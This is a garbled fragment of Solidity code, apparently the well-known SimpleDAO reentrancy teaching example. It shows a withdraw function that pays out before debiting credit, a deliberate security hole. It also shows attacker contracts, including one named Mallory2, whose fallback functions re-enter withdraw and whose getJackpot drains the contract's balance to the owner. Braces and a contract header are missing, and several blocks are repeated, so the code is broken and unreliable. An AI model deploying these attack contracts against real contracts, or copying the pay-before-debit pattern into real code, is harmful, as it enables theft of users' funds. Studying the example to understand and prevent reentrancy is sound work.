SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
function getJackpot() {
owner.send(this.balance);
function() {
dao.withdraw(dao.queryCredit(this));
contract Mallory2 {
SimpleDAO public dao;
address owner;
bool public performAttack = true;
function attack()  {
dao.donate.value(1)(this);
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
